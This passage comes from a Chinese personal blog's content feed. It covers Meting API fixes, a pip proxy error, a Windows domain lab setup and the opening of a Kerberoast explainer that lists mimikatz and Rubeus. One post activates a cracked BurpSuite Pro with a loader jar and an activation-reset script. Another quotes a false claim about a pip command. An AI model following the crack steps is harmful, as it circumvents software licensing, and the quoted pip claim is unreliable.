class="hljs-regexp">/meting/</span>api<br></code></pre></td></tr></tbody></table></figure><p>因此只要替换掉失效的API就可以了，从网络中找到的一个API:</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.injahow.cn<span class="hljs-regexp">/meting/</span><br></code></pre></td></tr></tbody></table></figure><p>尝试在网页中调用API:</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230613145703665.png" alt="image-20230613145703665"></p><p>成功解析，但是这个api的链接有些奇怪了🤦‍♂️</p><p>替换<strong>Blog\Hexo\node_modules\meting\dist</strong>目录下的Meting.min.js文件内容：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.i-meto.com<span class="hljs-regexp">/meting/</span>api --&gt; https:<span class="hljs-regexp">//</span>api.injahow.cn<span class="hljs-regexp">/meting/</span><br></code></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230613150050677.png" alt="image-20230613150050677"></p><p>最后刷新缓存，就可以看到文章中的音乐已经重新解析成功了。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>分享一首好听的歌</p><script src="https://cdn.jsdelivr.net/npm/hls.js"></script><p><video id="video" controls="" style="height: 100%;width: 100%;object-fit: cover"></video></p><script>  var video = document.getElementById('video');  var videoSrc = 'https://cdn.jsdelivr.net/gh/Honexz/video@5/Love.you.105.degree/ra105dn.m3u8';  if (Hls.isSupported()) {    var hls = new Hls();    hls.loadSource(videoSrc);    hls.attachMedia(video);    hls.on(Hls.Events.MANIFEST_PARSED, function() {      video.removeAttribute('muted'); // 取消静音      video.play(); // 开始播放    });  } else if (video.canPlayType('application/vnd.apple.mpegurl')) {    video.src = videoSrc;    video.addEventListener('loadedmetadata', function() {      video.removeAttribute('muted'); // 取消静音      video.play(); // 开始播放    });  }</script><p>哔哩哔哩 UP主:<strong><a href="https://space.bilibili.com/1950658">早稻叽</a></strong></p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>简记一次对burpsuite的更新</title>
    <link href="/posts/963d4df1/"/>
    <url>/posts/963d4df1/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>简记一次对burpsuite的更新</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前安装注册的BP是在国光的博客里找的教程和资源，有英文和汉化版本，版本是v2020.9.2，但是有个问题，就是光标和文字有两个文字的误差，用起来很别扭，我一直以为是版本或者汉化问题，就没有继续折腾了。今天又用到BP，实在是受不了了，打算换个新版本的BP。</p><p>我在升级BP的过程中，偶尔看到有人问显示问题，才发现以上问题是BP缩放导致的，我哭死。</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>资源链接：<a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1544866">吾爱</a>，同时也十分感谢作者的无私分享！</p><h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>这里看了下更新列表，选择了 BPv2022.9.2版本，下载解压，注意不要修改文件名。可阅读解压目录下的帮助文件， “说明.txt”。</p><p>重置激活状态bat:</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">@echo off<br><span class="hljs-keyword">echo</span> Reset the activation status of burpsuite<br><span class="hljs-keyword">echo</span>.<br><span class="hljs-keyword">echo</span> deleting roaming <span class="hljs-keyword">profile</span> data..<br>rd /s /q <span class="hljs-string">"%userprofile%\AppData\Roaming\BurpSuite\"</span><br><span class="hljs-keyword">echo</span>.<br><span class="hljs-keyword">echo</span> deleting javasoft registry <span class="hljs-built_in">keys</span>..<br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> <span class="hljs-string">"HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\burp"</span> /<span class="hljs-keyword">f</span><br><span class="hljs-keyword">echo</span>.<br><span class="hljs-keyword">echo</span> done!<br><span class="hljs-keyword">echo</span>.<br>pause<br></code></pre></td></tr></tbody></table></figure><p>也就是说，会删除配置文件，如果有需要，请备份C盘下%userprofile%\AppData\Roaming\BurpSuite\目录下的文件。</p><p>然后就是选择解压目录下的<strong>EN-JRE Burp.bat</strong>文件来注册激活BP。资源链接里有一个激活教程。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>新建一个vbs文件，编辑以下内容：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">CreateObject</span><span class="hljs-params">(<span class="hljs-string">"WScript.Shell"</span>)</span></span><span class="hljs-selector-class">.Run</span> <span class="hljs-string">""</span><span class="hljs-string">"java"</span><span class="hljs-string">" --illegal-access=permit -Dsun.java2d.uiScale=1 -javaagent:BurpSuiteChs.jar -Dfile.encoding=utf-8 -noverify -javaagent:BurpSuiteLoader.jar -jar burpsuite_pro_org.jar"</span>, <span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>保存后发送快捷方式到桌面，就可以快速启动BP了。</p><h3 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h3><p>-javaagent:BurpSuiteChs.jar：用于启动 BurpSuite 的汉化 jar 包</p><p>-Dsun.java2d.uiScale=1：强制BurpSuite缩放比为100%</p><h2 id="ISSUE"><a href="#ISSUE" class="headerlink" title="ISSUE"></a>ISSUE</h2><p>BurpSuite文本框里的光标和文字存在偏移</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>在启动BP的脚本加上参数-Dsun.java2d.uiScale=1，设置后，BP字体会很小，可以在BP的user options中的display设置字体大小。</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230610155157246.png" alt="image-20230610155157246"></p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>记录使用pip命令的一次踩坑</title>
    <link href="/posts/1840438d/"/>
    <url>/posts/1840438d/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><p>pip 是 Python 的包管理器。这意味着它是一个工具,允许你安装和管理不属于标准库的其他库和依赖。</p><h3 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h3><p>issue:pip报错：ValueError: check_hostname requires server_hostname</p><h3 id="记录使用pip命令的一次踩坑"><a href="#记录使用pip命令的一次踩坑" class="headerlink" title="记录使用pip命令的一次踩坑"></a>记录使用pip命令的一次踩坑</h3><p>今天使用dirsearch,突然抽风报错，说缺少依赖，就安装依赖呗，dirsearch下有个文件requirements.txt，记录了其所需的依赖。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requirements.txt<br></code></pre></td></tr></tbody></table></figure><p>执行命令报错：</p><blockquote><p>ERROR: Exception:</p><p>Traceback (most recent call last):<br>File “d:\python\lib\site-packages\pip_internal\cli\base_command.py”, line 180, in _main<br>status = self.run(options, args)<br>File “d:\python\lib\site-packages\pip_internal\cli\req_command.py”, line 205, in wrapper<br>return func(self, options, args)<br>File “d:\python\lib\site-packages\pip_internal\commands\install.py”, line 318, in run<br>requirement_set = resolver.resolve(<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\resolver.py”, line 127……</p></blockquote><p>报错非常长，我习惯性的从ERROR后截取一段来搜索，搜索报错有两种原因：</p><p>1.pip版本过老</p><p>2.网络问题(更换国内镜像)</p><h3 id="检查报错原因1"><a href="#检查报错原因1" class="headerlink" title="检查报错原因1"></a>检查报错原因1</h3><p>这里习惯性的尝试了直接使用解决方法，升级pip</p><figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -m pip install <span class="hljs-comment">--upgrade pip</span><br></code></pre></td></tr></tbody></table></figure><p>然后又是一堆报错，搜索报错的原因，提示我尝试清除缓存</p><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pip cache purge</span><br></code></pre></td></tr></tbody></table></figure><p>又报错：</p><blockquote><p>ERROR: No matching packages</p></blockquote><p>搜索报错，网上给出的原因：缓存已经被清空或者是pip 版本较老导致的。</p><p>解决办法：</p><ol><li>升级pip：在命令行中执行 python -m pip install –upgrade pip命令，升级 pip到最新版本。然后再尝试执行 pip cache purge 命令。</li><li>直接删除缓存目录：在命令行中执行以下命令，手动删除 pip 的缓存目录：<ul><li>Windows：rmdir /s %HOME%\AppData\Local\pip\Cache</li><li>Linux/MacOS：rm -rf ~/.cache/pi</li></ul></li></ol><hr><p>看到这个回答，我想这不是形成了闭环吗？</p><p>到这里其实已经花费了很多时间，从互联网找答案真的很消耗耐心，各种信息里需要筛选正确的答案，很容易走弯路。</p><p>这个时候我反而安静下来了，我仔细想了一下 pip更新很快吗？我安装的pip版本是多少呢？</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip</span> --version<br><span class="hljs-attribute">pip</span> <span class="hljs-number">21</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span> from d:\python\lib\site-packages\pip (python <span class="hljs-number">3</span>.<span class="hljs-number">9</span>)<br></code></pre></td></tr></tbody></table></figure><p>当我看到21.1.3 我内心大概有了猜测，搜索“pip 21.1.3 ERROR: No matching packages”,得到一个答案：</p><blockquote><p>在 pip 版本 20.3 或更高版本中，pip cache purge 命令已经被废弃，并且在最新版本的pip中已经被删除。因此，如果您使用的是 pip 版本 21.1.3，执行 pip cache purge 命令会提示 “ERROR: No matching packages”，这是因为此命令已经不存在了。</p></blockquote><p>这个时候我直接搜索了全部的报错信息：</p><blockquote><p>ERROR: Exception:<br>Traceback (most recent call last):<br>File “d:\python\lib\site-packages\pip_internal\cli\base_command.py”, line 180, in _main<br>status = self.run(options, args)<br>File “d:\python\lib\site-packages\pip_internal\cli\req_command.py”, line 205, in wrapper<br>return func(self, options, args)<br>File “d:\python\lib\site-packages\pip_internal\commands\install.py”, line 318, in run<br>requirement_set = resolver.resolve(<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\resolver.py”, line 127, in resolve<br>result = self._result = resolver.resolve(<br>File “d:\python\lib\site-packages\pip_vendor\resolvelib\resolvers.py”, line 473, in resolve<br>state = resolution.resolve(requirements, max_rounds=max_rounds)<br>File “d:\python\lib\site-packages\pip_vendor\resolvelib\resolvers.py”, line 341, in resolve<br>name, crit = self._merge_into_criterion(r, parent=None)<br>File “d:\python\lib\site-packages\pip_vendor\resolvelib\resolvers.py”, line 172, in _merge_into_criterion<br>if not criterion.candidates:<br>File “d:\python\lib\site-packages\pip_vendor\resolvelib\structs.py”, line 139, in bool<br>return bool(self.sequence)<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\found_candidates.py”, line 143, in bool<br>return any(self)<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\found_candidates.py”, line 129, in <genexpr><br>return (c for c in iterator if id(c) not in self.incompatible_ids)<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\found_candidates.py”, line 30, in _iter_built<br>for version, func in infos:<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\factory.py”, line 269, in iter_index_candidate_infos<br>result = self._finder.find_best_candidate(<br>File “d:\python\lib\site-packages\pip_internal\index\package_finder.py”, line 879, in find_best_candidate<br>candidates = self.find_all_candidates(project_name)<br>File “d:\python\lib\site-packages\pip_internal\index\package_finder.py”, line 824, in find_all_candidates<br>page_candidates = list(page_candidates_it)<br>File “d:\python\lib\site-packages\pip_internal\index\sources.py”, line 134, in page_candidates<br>yield from self._candidates_from_page(self._link)<br>File “d:\python\lib\site-packages\pip_internal\index\package_finder.py”, line 783, in process_project_url<br>html_page = self._link_collector.fetch_page(project_url)<br>File “d:\python\lib\site-packages\pip_internal\index\collector.py”, line 512, in fetch_page<br>return _get_html_page(location, session=self.session)<br>File “d:\python\lib\site-packages\pip_internal\index\collector.py”, line 422, in _get_html_page<br>resp = _get_html_response(url, session=session)<br>File “d:\python\lib\site-packages\pip_internal\index\collector.py”, line 120, in _get_html_response<br>resp = session.get(<br>File “d:\python\lib\site-packages\pip_vendor\requests\sessions.py”, line 555, in get<br>return self.request(‘GET’, url, kwargs)<br>File “d:\python\lib\site-packages\pip_internal\network\session.py”, line 449, in request<br>return super().request(method, url, *args, kwargs)<br>File “d:\python\lib\site-packages\pip_vendor\requests\sessions.py”, line 542, in request<br>resp = self.send(prep, send_kwargs)<br>File “d:\python\lib\site-packages\pip_vendor\requests\sessions.py”, line 655, in send<br>r = adapter.send(request, kwargs)<br>File “d:\python\lib\site-packages\pip_vendor\cachecontrol\adapter.py”, line 53, in send<br>resp = super(CacheControlAdapter, self).send(request, **kw)<br>File “d:\python\lib\site-packages\pip_vendor\requests\adapters.py”, line 439, in send<br>resp = conn.urlopen(<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\connectionpool.py”, line 696, in urlopen<br>self._prepare_proxy(conn)<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\connectionpool.py”, line 964, in _prepare_proxy<br>conn.connect()<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\connection.py”, line 359, in connect<br>conn = self._connect_tls_proxy(hostname, conn)<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\connection.py”, line 500, in <em>connect_tls_proxy<br>return ssl_wrap_socket(<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\util\ssl</em>.py”, line 432, in ssl_wrap_socket<br>ssl_sock = <em>ssl_wrap_socket_impl(sock, context, tls_in_tls)<br>File “d:\python\lib\site-packages\pip_vendor\urllib3\util\ssl</em>.py”, line 474, in _ssl_wrap_socket_impl<br>return ssl_context.wrap_socket(sock)<br>File “d:\python\lib\ssl.py”, line 500, in wrap_socket<br>return self.sslsocket_class._create(<br>File “d:\python\lib\ssl.py”, line 997, in _create<br>raise ValueError(“check_hostname requires server_hostname”)<br>ValueError: check_hostname requires server_hostname</genexpr></p></blockquote><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><blockquote><p>这个报错是由于 <code>pip</code> 在使用 TLS 代理时出现了问题。</p><p>问题可能是由于您使用的代理服务器没有正确配置 TLS 证书，或者是由于代理服务器返回的响应中缺少必要的信息导致的。</p></blockquote><p>📌我看到这个回答，马上就明白可能是因为我开了<strong>网络代理</strong>的原因。</p><p>📌关闭代理后，执行命令一切正常了。</p><p>做完这一切后，知道自己又陷入经验主义的错误后，想到了自己以前经常犯的错误：</p><p><strong>报错的真正原因可能是在出现在头部，也可能在尾部，而不应该总是从ERROR开始跟踪报错</strong></p><p>之后又仔细查看了报错，搜索了这么一个关键报错：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pip ValueError: check_hostname <span class="hljs-keyword">requires</span> server_hostname<br></code></pre></td></tr></tbody></table></figure><p>w3c的一个回答不错，还有分析：<a href="https://www.w3cschool.cn/article/92755260.html">文章链接</a></p><p>分析如下：</p><blockquote><p>出现这个错误的原因是使用了代理，由于”总”所周知的原因，有些外网需要一些特殊手段才能访问，而要访问这些网站就需要使用代理，作者的朋友当时就是代理没有关掉，所以在pip的时候才会报错。</p><p>为什么使用代理会出现这样的错误呢，作者找到了蛛丝马迹：pip的较新的版本有这样的一个要求，就是标记对pip仓库的信任，或者使用https进行数据传输（类似的问题作者在学习linux的时候也遇到过）。而使用代理会导致pip认为你请求的仓库不是安全的，所以安装失败，所以解决方法就是关闭代理，或者在代理中设置相关内容。</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="pip报错"><a href="#pip报错" class="headerlink" title="pip报错"></a>pip报错</h3><p>ERROR: Exception:</p><p>Traceback (most recent call last):<br>File “d:\python\lib\site-packages\pip_internal\cli\base_command.py”, line 180, in _main</p><p>……</p><p>ValueError: check_hostname requires server_hostname</p><h3 id="一个解决办法"><a href="#一个解决办法" class="headerlink" title="一个解决办法"></a>一个解决办法</h3><p>有可能是开启了网络代理的原因，请关闭网络代理尝试重新执行命令。</p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows 域环境的搭建</title>
    <link href="/posts/bbf780e8/"/>
    <url>/posts/bbf780e8/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="域环境的搭建"><a href="#域环境的搭建" class="headerlink" title="域环境的搭建"></a>域环境的搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当你需要搭建域环境，那么说明应该对什么是域已经有一定的了解，不细说，随便找了一篇介绍搭建域环境的<a href="https://www.cnblogs.com/romatic/p/13284787.html">文章</a>，时效性自行验证，本文主要讨论搭建域环境需要注意的事情，帮助那些在搭建域环境和我一样踩坑的人。</p><p>虚拟机软件：VMware Workstation Pro</p><p>IOS镜像：<a href="https://msdn.itellyou.cn/">MSDN</a></p><p>​tips：小米手机自带浏览器就可以新建ed2k类型(ED2K可视为P2P下载链接)的下载任务.</p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>在虚拟机的菜单栏可以选择“编辑-&gt;虚拟网络编辑器”，可以看到我们的虚拟网络适配器，一般情况下：</p><ul><li>虚拟网络适配器VMnet1是 <strong>仅主机模式</strong> 默认的虚拟网络适配器</li><li>虚拟网络适配器VMnet8是 <strong>NAT模式</strong> 默认的虚拟网络适配器</li></ul><p>在后文，我们将虚拟网络适配器理解为网卡。我为域环境内的计算机添加的网卡选择的模式就是仅主机模式，在搭建域环境的时候比较重要的是选择合适的网段，我的VMnet1子网IP段为192.168.10.0/24，掩码255.255.255.0，因为我不希望我的计算机的IP地址是随机的，因此取消勾选使用DHCP将IP分给虚拟机，这就是说我们要手动给计算机分配IP，这里是否取消勾选是不重要的。</p><p>设置了子网IP段后，也就是说我们的域内计算机所在的内网IP段已经确定，在手动给域内计算机分配IP时，IP要属于这一网段。</p><h2 id="计算机IP设置"><a href="#计算机IP设置" class="headerlink" title="计算机IP设置"></a>计算机IP设置</h2><p>虚拟机的网段设置好后，我们要为我们的域内计算机手动分配静态IP。</p><h3 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h3><p>在window操作系统的图形界面中，找到网络适配器，更改适配器设置，在属性里，修改IPV4的设置，选择合适的IP作为静态IP，DNS的设置为你部署DNS服务的计算机的IP，一般在域控部署DNS服务，那么不论是域控还是域用户的计算机，DNS都可以设置为域控的IP地址。</p><p>然后在cmd中，重启网卡后，可以使用ipconfig查看网卡对应的IP地址。</p><h3 id="Linux操作系统"><a href="#Linux操作系统" class="headerlink" title="Linux操作系统"></a>Linux操作系统</h3><p>Linux操作系统是不方便加入Windows域中的，在搭建域环境，尽量不要打算使用Linux系统的计算机入域。这里来讲一下如何给Linux系统的计算机设置静态IP的步骤：</p><p>要给Linux计算机设置静态IP地址，需要进行以下步骤：</p><ol><li><p>打开终端窗口，使用文本编辑器打开网络配置文件。在大多数Linux发行版中，网络配置文件位于“/etc/network/interfaces”或“/etc/sysconfig/network-scripts/”目录下，具体路径可能会有所不同。</p></li><li><p>找到需要设置静态IP地址的网络接口，例如eth0。在接口配置块中添加以下内容：</p></li></ol><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">auto</span> eth0<br>iface eth0 inet static<br>address <span class="hljs-number">192.168.1.100</span>     <span class="hljs-comment"># 设置静态IP地址</span><br>netmask <span class="hljs-number">255.255.255.0</span>    <span class="hljs-comment"># 设置子网掩码</span><br>gateway <span class="hljs-number">192.168.1.1</span>      <span class="hljs-comment"># 设置网关地址</span><br>dns-nameservers <span class="hljs-number">8.8.8.8</span>  <span class="hljs-comment"># 设置DNS服务器地址</span><br></code></pre></td></tr></tbody></table></figure><p>在上述配置中，address为需要设置的静态IP地址，netmask为子网掩码，gateway为网关地址，dns-nameservers为DNS服务器地址。这些信息需要根据实际情况进行修改。</p><ol start="3"><li>保存文件并关闭文本编辑器。然后，使用以下命令重启网络服务，使配置生效：</li></ol><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl restart networking</span><br></code></pre></td></tr></tbody></table></figure><p>执行完上述命令后，静态IP地址就会生效。可以使用ifconfig命令或ip addr命令检查网络接口的IP地址是否已经改变。</p><p>需要注意的是，在设置静态IP地址时，需要确保该IP地址没有被其他设备使用，并且与所在网络的IP地址段、子网掩码、网关地址等参数相匹配，否则网络连接可能会出现问题。</p><h3 id="域控的搭建"><a href="#域控的搭建" class="headerlink" title="域控的搭建"></a>域控的搭建</h3><p>搭建域控根据网上靠谱的教程都是没有问题的，但这里要列一下注意点：</p><ul><li>部署DC时，如果教程没有让你同时勾选DNS服务器，如果没有别的要求，即DNS可以和域控在同一计算机，勾选DNS服务器！</li><li>.net formwork3.5和.net formwork4.6最好一起勾选</li><li>域控设置域名时，不要离谱，尽量符合域名的命名格式，同时也要避免选择的域名为已经在互联网已经被频繁使用。</li></ul><h3 id="计算机入域"><a href="#计算机入域" class="headerlink" title="计算机入域"></a>计算机入域</h3><p>假设我们已经在windows server 2016部署了域控和DNS服务器，域名为fraxdeo.web,另一台计算机win 7要入域，那么这些工作是必须的：</p><p>win 7的DNS服务器地址为：DNS服务器所在计算机的IP地址，一般为域控的IP地址。</p><p>已经为入域的计算机选择了合适的域内用户，并设置了账户名和密码。</p><p>win 7可以ping通域名。</p><h2 id="踩过的坑"><a href="#踩过的坑" class="headerlink" title="踩过的坑"></a>踩过的坑</h2><p>1.计算机不能加入域</p><p>在域内，win 7可以ping通域控域名，也可以ping通域控域名，回复的IP是域控在内网的静态IP，但是加域时依旧报错，信息如下：</p><blockquote><p>已成功查询 DNS，获取服务位置(SRV)资源记录(此资源记录用于查找域“feaxdeo.web”的域控制器):</p><p>此查询用于查找 _ldap._tcp.dc._msdcs.feaxdeo.web 的 SRV 记录</p><p>下列域控制器由查询识别:<br>        DC.feaxdeo.web</p><p>但是无法连接到域控制器。</p><p>此错误的常见原因包括:</p><ul><li>将域控制器的名称映射到其 IP 地址的主机(A)或主机(AAAA)记录丢失或包含错误地址。</li><li>在 DNS 中注册的域控制器没有连接到网络上，或没有运行。<br>报错如上，请分析</li></ul></blockquote><p>原因：因为一些原因，给域控添加了两张网卡，一张仅主机模式在内网，一张NAT模式连接外网，导致加域失败。</p><p>解决办法：删除多余的网卡</p><p>2.加域后计算机登陆问题</p><p>比如我们加域前一直用用户fraxdeo登陆win 7，加域时使用的用户是abc，win 7加域后登陆时的用户一般就是fraxdeo/abc,前面的fraxdeo是域名，如果要登陆到自己的计算机，登陆名应该是<strong>计算机名/用户名。</strong></p><p>3.ping不通域名</p><p>要加域的计算机可以ping通域控的IP，但是ping不同域名，也就是DNS问题，除了常见问题，如DNS地址设置不正确，还可以手动配置域控制器的主机记录(A/AAAA)。</p><blockquote><p>要配置域控制器的主机记录(A/AAAA)，以确保正确的 DNS 解析，可以按照以下步骤进行操作：</p><ol><li>登录到域控制器服务器上，打开“DNS 管理器”，并展开相应的 DNS 区域。</li><li>在左侧窗格中找到要添加或修改主机记录的主机名，右键单击它，并选择“新建记录”选项。</li><li>在“新建记录”对话框中，选择记录类型为“主机(A)”或“主机(AAAA)”，并填写以下信息：<ul><li>名称：填写要添加或修改主机记录的主机名。</li><li>IP 地址：填写要映射到该主机名的 IP 地址。</li><li>时间到期：根据需要设置记录的到期时间。</li></ul></li><li>单击“确定”按钮，以创建或修改主机记录。现在，在 DNS 区域中，您应该能够看到新添加或修改的主机记录。</li></ol><p>请注意，在添加或修改主机记录时，请确保填写正确的主机名和 IP 地址。如果主机名或 IP 地址填写错误，可能会导致DNS 解析失败。此外，如果您在添加或修改主机记录时遇到任何问题，请参考相关的技术文档和教程，或者咨询专业的 IT 技术人员，以获取更多帮助和支持。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kerberoast攻击分析</title>
    <link href="/posts/b244341/"/>
    <url>/posts/b244341/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我将使用chatGPT在前言对一些基础性知识进行解释。</p><p>需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。</p><h3 id="什么是Kerberoast攻击"><a href="#什么是Kerberoast攻击" class="headerlink" title="什么是Kerberoast攻击"></a>什么是Kerberoast攻击</h3><blockquote><p>Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用户身份验证和授权。在 Kerberos 协议中，用户会向 Kerberos 服务器请求一个安全令牌（ticket），用于在 Windows 域环境中访问资源。</p><p>Kerberoast 攻击利用了 Kerberos 协议中的漏洞，通过获取 Kerberos 中的服务票据（Service Ticket），并对其进行离线攻击，从而获取到目标用户的明文密码。攻击者可以利用 Kerberoast 攻击来在不知道用户密码的情况下获取到用户的密码哈希值，然后使用密码破解工具对其进行破解，最终获取到用户的明文密码。由于攻击者可以在离线环境中进行攻击，因此 Kerberoast 攻击可以避免被 Kerberos 协议的防护机制所检测到。</p></blockquote><h3 id="什么是SPN"><a href="#什么是SPN" class="headerlink" title="什么是SPN"></a>什么是SPN</h3><blockquote><p>SPN（Service Principal Name）是指服务主体名称，是 Kerberos 身份验证协议中用于标识服务实例的唯一标识符。SPN 通常由服务名称和主机名组成，用于标识服务在网络上的唯一实例，帮助 Kerberos 协议正确地将服务票据（Service Ticket）授予给服务实例。</p><p>在 Windows 域环境中，SPN 是非常重要的，因为 Kerberos 身份验证协议是 Windows 域环境中最常用的身份验证协议。如果 SPN 配置不正确，可能会导致 Kerberos 身份验证协议无法正常工作，从而影响到整个域环境的安全和稳定性。</p></blockquote><h4 id="SPN的类型"><a href="#SPN的类型" class="headerlink" title="SPN的类型"></a>SPN的类型</h4><ul><li>一种是注册在活动目录的机器帐户（Computers）下。当一个服务的权限为 Local System 或 Network Service 时，则 SPN 注册在机器帐户（Computers）下。</li><li>另一种是注册在活动目录的域用户帐户（Users）下，当一个服务的权限为一个域用户时，则 SPN 注册在域用户帐户（Users）下。</li></ul><p>域环境下执行命令：<code>setspn -q */*</code>查看当前域内所有SPN，SPN分类如下：</p><p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN,默认有三个：</p><p>域控制器：CN=DC,OU=Domain Controllers,DC=fraxdeo,DC=cn</p><p>域用户帐户：CN=krbtgt,CN=Users,DC=fraxdeo,DC=cn</p><p>机器帐户：CN=WIN7,CN=Computers,DC=fraxdeo,DC=cn</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h3><p>从内存中提取明文密码、散列、PIN 码和 kerberos 票据现在已广为人知。**<code>mimikatz</code>**还可以执行 pass-the-hash、pass-the-ticket 或 build <em>Golden tickets</em>。</p><h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></h3><p>Rubeus是一个 C# 工具集，是可以针对Kerberos协议进行攻击的工具,可以发起Kerberos请求,并将请求票据导入内存中,Rebeus提供了大量的用于Kerberos攻击的功能,比如TGT请求/ST请求/AS-REP Roasting攻击/Kerberoasting攻击/委派攻击/黄金票据/白银票据等。</p><h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><a 